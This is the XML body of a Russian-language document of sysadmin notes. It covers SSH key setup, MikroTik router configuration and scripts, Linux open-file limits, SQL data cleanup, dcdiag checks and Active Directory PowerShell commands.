      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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1"><text:span text:style-name="T5">Generating public/private rsa key pair.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter file in which to save the key (/root/.ssh/id_rsa): &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Created directory '/root/.ssh'.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter passphrase (empty for no passphrase): &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter same passphrase again: &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Your identification has been saved in /root/.ssh/id_rsa.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Your public key has been saved in /root/.ssh/id_rsa.pub.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">В ответ увидим примерно: ssh-rsa AAAAB3Nz.....ywWmpl root@server1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Теперь нужно передать публичный ключ id_rsa.pub пользователя root на server2, для этого на server1 выполняем: ssh-copy-id -i ~/.ssh/id_rsa.pub root@server2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Вводим пароль root от сервера server2 и ключ будет передан и записан в нужный файл authorized_keys</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PermitRootLogin yes - Вход под root по ssh разрешен.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PermitRootLogin no - Вход под root по ssh запрещен.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T5">PermitRootLogin without-password - Вход под root по ssh разрешен только по ssh ключам.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">command="rsync" ssh-rsa AAAAB3N……. root@server2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">После изменения PermitRootLogin не забудьте перезапустить службу sshd командой: service sshd restart</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add chain=forward comment="Permit all PPP" in-interface=all-ppp</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Разрешить PPTP-подключение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add chain=input dst-port=1723 protocol=tcp comment="Permit PPTP"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=accept chain=input protocol=gre comment="Permit GRE"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Разрешить L2TP-подключение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add chain=input dst-port=1701 protocol=udp comment="Permit L2TP"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Разрешить IPSec-подключение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add chain=input port=500,4500 protocol=udp comment="Permit IPSec ports 500 and 4500"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add chain=input protocol=ipsec-esp comment="Permit IPSec protocol ipsec-esp"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Разрешить OpenVPN-подключение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=accept chain=input dst-port=1194 protocol=tcp comment="Permit OpenVPN"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. Разрешить SSTP-подключение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=accept chain=input dst-port=443 protocol=tcp comment="Permit SSTP"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">7. Разрешить GRE-подключение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=accept chain=input protocol=gre comment="Permit GRE"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">8. Разрешить IPIP-подключение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=accept chain=input protocol=ipip comment="Permit IPIP"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">9. Прохождение IPSec при использовании Fast Track</text:span></text:p>
      <text:p text:style-name="P1"><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14"><text:span text:style-name="T5">/ip firewall filter add chain=forward action=fasttrack-connection connection-state=established,related</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall mangle</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=out,ipsec new-connection-mark=ipsec</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=in,ipsec new-connection-mark=ipsec</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Далее изменить стандартное правило Fast Track так, что бы оно не обрабатывало пакеты IPsec. Изменения внесенные в стандартное правило выделены красным.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter add action=fasttrack-connection chain=forward comment=FastTrack</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">connection-mark=!ipsec connection-state=established,related</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Средства анализа и просмотра log-файлов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Alco (Apache Log Colorizing Tool) (https://www.linuxpages.org/) - Утилита для подсветки log-файлов web-сервера Apache. Написана на awk.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">KDE LogViewer (https://kdelogviewer.sourceforge.net/) - Утилита для просмотра log-файлов для KDE. Имеет: фильтр, события, отображение строк разными цветами в зависимости от log-файла.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Logcheck (https://logcheck.org/) - Простая утилита для фильтрации log-файлов на «не обычные» записи (в.т.ч. и с помощью регулярных выражений) и отправки отчета на e-mail.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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2"><text:span text:style-name="T5">MultiTail (https://github.com/halturin/multitail) - Аналог утилиты tail, позволяющий показывать данные из файлов в нескольких окнах одной консоли. Основан на ncurses.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как найти количество открытых файлов в Linux? Значение сохраняется в: # cat /proc/sys/fs/file-max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Проверка Hard лимит в Linux: # ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Проверка Soft лимит в Linux: # ulimit -Sn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># su root</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$ ulimit -Sn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Вы можете проверить текущее значение для количества открытых файлов с помощью следующей команды: $ cat /proc/sys/fs/file-max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Добавьте следующую команду: fs.file-max=500000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Конечно, вы можете изменить число в соответствии с вашими потребностями. Чтобы снова проверить изменения, используйте: # cat /proc/sys/fs/file-max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">## Example hard limit for max opened files</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">dimon hard nofile 4096</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">## Example soft limit for max opened files</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">dimon soft nofile 1024</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Подборка SQL-запросов для очистки данных. Удаляем дубликаты записей:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DELETE FROM your_table</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">WHERE rowid NOT IN (</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>SELECT MAX(rowid)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>FROM your_table</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>GROUP BY column1, column2, ...</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Удаляем строки с NULL-значениями:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DELETE FROM your_table</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">WHERE column1 IS NULL OR column2 IS NULL;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Заменяем NULL-значения на дефолтное выражение:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">UPDATE your_table</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SET column1 = 'default_value'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">WHERE column1 IS NULL;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Переводим текст в верхний регистр:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">UPDATE your_table</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SET column1 = UPPER(column1);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Обрезаем лишнее:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">UPDATE your_table</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SET column1 = TRIM(column1);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Конвертируем строки в формат дат:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">UPDATE your_table</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SET date_column = TO_DATE(date_string, 'YYYY-MM-DD');</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Извлекаем год/месяц/день:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SELECT EXTRACT(YEAR FROM date_column) AS year,</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="7"/>EXTRACT(MONTH FROM date_column) AS month,</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="7"/>EXTRACT(DAY FROM date_column) AS day</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">FROM your_table;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">#db</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Установка своих DNS серверов и отключение получения их по DHCP:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip dns set servers=8.8.8.8,1.1.1.1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip dhcp-client set [find ] use-peer-dns=no</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/tool e-mail</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">set address=smtp.yandex.ru from=example@yandex.ru password=example-pass port=587 start-tls=yes user=example@yandex.ru</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва):</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system clock set time-zone-autodetect=no</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system clock set time-zone-name=Europe/Moscow</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip cloud set update-time=yes </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Изменение количества строк системного лога: /system logging action set memory memory-lines=10000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Очистка системного лога (оставляет сообщение о смене настроек лога):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system logging action set memory memory-lines=1</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">/system logging action set memory memory-lines=10000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall address-list</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">add address=access.example.con list=DomainIPsAccess</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=accept chain=input src-address-list=DomainIPsAccess comment="Allow DomainIPsAccess"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">move [find comment="Allow DomainIPsAccess"] 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">move [find comment="Allow DomainIPsAccess"] 0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Отключение ненужных служб доступа (web тоже отключается, осторожно):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service disable www,ftp,api,api-ssl,telnet</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service enable ssh,winbox</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service set ssh address=""</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service set winbox address=""</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Фикс MTU (нужен редко, но метко):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall mangle</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add chain=postrouting out-interface-list=WAN protocol=tcp tcp-flags=syn,!ack action=change-mss new-mss=clamp-to-pmtu comment="MTU Fix" passthrough=yes</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Заблокировать доступ к WiFi по MAC-адресу: /interface wireless access-list authentication=no mac-address=8A:EA:B7:2E:38:C1 </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Поместить клиента WiFi в отдельный VLAN по MAC-адресу:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/interface wireless access-list</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Настройка пароля и безопасности WiFi на default профиль:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/interface wireless security-profiles set default mode=dynamic</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">wpa2-pre-shared-key=bigpassword</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Включение пробросов портов SSH: /ip ssh set forwarding-enabled=both</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Выделите диапазон таблицы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Нажмите клавишу «F5» и тапните «Выделить».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. В открывшемся окошке выберите опцию «Пустые ячейки» → «ОК».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Выделение со всей таблицы переместится только на пустые строки таблицы.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">5. Нажмите клавиши «Ctrl+”-”» (знак минуса), отметьте, что хотите удалить «строки» и щелкните «ОК».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ИИ + Excel/Google Docs. Часть 1. Ускоряем, облегчаем и делаем работу с Excel более приятной:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. GPTExcel (https://t.me/KladovkaPavlu/1841) - нейронка, генерирующая формулы Excel, SQL запросы и не только. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Genius Sheets (https://www.geniussheets.com/) - делает финансовые отчеты и различные таблицы в Excel/Docs;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Formulas HQ (https://formulashq.com/) - переводит текст в таблицы Google Docs и Excel, помогает с формулами и т.д;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">4. formula bot (https://formulabot.com/) - переводит ваши текстовые инструкции в Excel формулы!;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">5. Sheet AI (https://www.sheetai.app/) - переводит ваши текстовые инструкции в формулы Google таблиц;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">6. AI Excel Bot (https://aiexcelbot.com/) - новый продукт, помогает с формулами. строит таблицы и т. д.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Скрипт проверки активности всех ppp-соединений Mikrotik:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># если по тоннелю пинга нет, то осуществляется разрыв тоннеля для переподключения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># внимание ! скрипт будет отключать активное vpn-соединение с админом, т.к. до него пинга не будет !</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># поэтому в скрипте сделан обход удаления данного соединения (задаётся в adminClient, должен соответствовать ppp secret)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local adminClient "you ppp secret admins` name"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local pppTest value=[/ppp active find];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local pingNumber value=2;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:local pingMin value=1;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:foreach userTest in=$pppTest do={</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s/>:local pingOk value=[:ping [/ppp active get $userTest value-name=address] count=$pingNumber]</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5"><text:s/>:if (($pingOk &lt; $pingMin) &amp;&amp; ([/ppp active get $userTest value-name=name]!=$adminClient)) do={</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>:log warning message=([/ppp active get $userTest value-name=service] . " auto disconnected: ". $pingOk . " ping ok over " . $pingNumber . " " . [/ppp active get $userTest value-name=name] . " " . [/ppp active get $userTest value-name=address])</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ppp active remove $userTest</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s/>}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">если нужно проверять только определенный вид ppp замените строку :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># :local pppTest value=[/ppp active find];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">на строку, например</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># :local pppTest value=[/ppp active find where service=pptp];</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Для использования поставьте этот скрипт в Планировщик с нужным интервалом (оптимально не менее 30 сек)</text:span></text:p>
      <text:p text:style-name="P1"><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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">CheckSDRefDom - Проверяет правильность доменов ссылок дескрипторов безопасности для каждого раздела каталогов программ</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">CrossRefValidation - Проверяет правильность перекрестных ссылок для доменов</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">RRSSysvol - проверяет состояние готовности для FRS SYSVOL</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">KCCEvent - Проверяет безошибочность создания объектов соединений для репликации между сайтами</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">KnowsOfRoleHolders - Проверяет возможность подключения контроллеров домена ко всем пяти хозяевам операций</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">NCSecDesc - Проверяет правильность разрешений для репликации в дескрипторах безопасности для заголовков контекста именования</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">NetLogons - Проверяет правильность разрешений регистрации, позволяющих регистрацию, для каждого контроллера домена</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ObjectsReplicated - Проверяет правильность репликации агента сервера каталогов и объектов учетных записей компьютеров</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">OutboundSecureChannels - Проверяется наличие безопасных каналов между всеми контроллерами домена в интересующем домене</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Replications - Проверяет возможность репликации между контроллерами домена и сообщает обо всех ошибках при репликации</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">RidManager - Проверяет работоспособность и доступность хозяина относительных идентификаторов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Services - Проверяет работоспособность всех служб, необходимых для работы контроллера домена, на указанном контроллере домена</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SystemLog - Проверяет безошибочность работы системного журнала</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">VerifyEnterpriseReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на всех контроллерах домена в лесу</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">VerifyReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на указанном контроллере домена</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">VerifyReplicas - Проверяет действительность всех разделов каталога приложения на всех серверах, принимающих участие в репликации</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Синтаксис команды dcdiag: dcdiag /s:&lt;DomainController&gt; [/n:&lt;NamingContext&gt;] [[/u:&lt;domain\user&gt;] [/p:&lt;password&gt;] ] [{/a|/e}{/q|/v}] [/i] [/f:&lt;LogFile&gt;] [/ferr:&lt;ErrorLog&gt;] [/c [/skip:&lt;test]] [/test:&lt;test&gt;] [/fix]</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Перед использованием командлета Set-ADAccountPassword вы должны импортировать этот модуль в сеанс PowerShell: Import-Module ActiveDirectory</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">Если вы хотите, чтобы пользователь изменил пароль при следующем входе в систему, выполните команду: Set-ADUser jkelly -ChangePasswordAtLogon $True</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$ttl = New-TimeSpan -Minutes 2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Add-ADGroupMember -Identity "Администраторы домена" -Members alex -MemberTimeToLive $ttl</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Основы компьютерных сетей:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №1. Основные сетевые термины и сетевые модели (https://habr.com/ru/post/307252/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №2. Протоколы верхнего уровня (https://habr.com/ru/post/307714/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №3. Протоколы нижних уровней (транспортного, сетевого и канального) (https://habr.com/ru/post/308636/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №4. Сетевые устройства и виды применяемых кабелей (https://habr.com/ru/post/312340/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №5. Понятие IP адресации, масок подсетей и их расчет (https://habr.com/ru/post/314484/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №6. Понятие VLAN, Trunk и протоколы VTP и DTP (https://habr.com/ru/post/319080/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №7. Протокол связующего дерева: STP (https://habr.com/ru/post/321132/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Тема №8. Протокол агрегирования каналов: Etherchannel (https://habr.com/ru/post/334778/)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Тема №9. Маршрутизация: статическая и динамическая на примере RIP, OSPF и EIGRP (https://habr.com/ru/post/335090/)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$ sudo blkid</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/dev/sda1: LABEL="st" UUID="36F20D4DF20D12B3" TYPE="ntfs" </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/dev/sda2: LABEL="SysWin" UUID="A4F20F67F20F3D54" TYPE="ntfs" </text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">/dev/sda5: UUID="1efdbdda-df38-4f60-bb2c-81996eff323c" TYPE="swap" </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/dev/sda6: UUID="1eab3a42-b6c3-44e5-9e18-2ff284ecfba3" TYPE="ext4" </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/dev/sda7: LABEL="Data" UUID="5F573D4D2CFD981F" TYPE="ntfs"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$ sudo su</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># mkdir /media/WinData</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># chmod 777 /media/WinData</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Скрипты для диагностики DNS:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">https://github.com/m0zgen/dns-tester - Тестирование скорости ответа DNS со статистикой превышения, минимума, максимума;</text:span></text:p>
